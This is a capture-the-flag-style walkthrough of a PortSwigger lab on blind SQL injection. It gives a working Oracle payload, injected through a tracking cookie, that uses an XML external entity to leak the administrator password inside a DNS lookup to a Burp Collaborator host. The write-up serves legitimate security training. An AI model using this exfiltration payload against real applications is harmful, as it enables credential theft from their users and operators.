# Lab: Blind SQL injection with out-of-band data exfiltration

Lab-Link: <https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration>  
Difficulty: PRACTITIONER  
Burp Suite Professional is required to solve this lab!

## Known information

- vulnerable to blind SQL injection
- parameter: value of tracking cookie
- Result of injection: No visible difference in page, no timing difference
- DB may perform DNS queries
- database contains a `users` table with columns `username` and `password`
- Goal:
  - Exfiltrate the administrator password
  - Login as administrator user

## Query

The query will look something like

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

In example case, the cookie contains this content
`Cookie: TrackingId=BR3agStQwzeln8Z6; session=cQ7k63wrOmVgTV4P62F5zEYadIbtX9e9`

I will omit the complete cookie content from now on and only provide the string appended to the TrackingId value.

## Steps

The first step is identical to the [previous lab](../Blind_SQL_injection_with_out-of-band_interaction/README.md) so I do not repeat it here.

After confirming this Lab uses an Oracle database as well, I simply insert the password into as subdomain into the DNS query:

`'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.3txa3t7g4os2eh9558lzp3fqbhh75w.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)||'`

The Burp collaborator client then provides me with the administrator password:

![collaborator hit](img/collaborator_result.png)

![success](img/success.png)
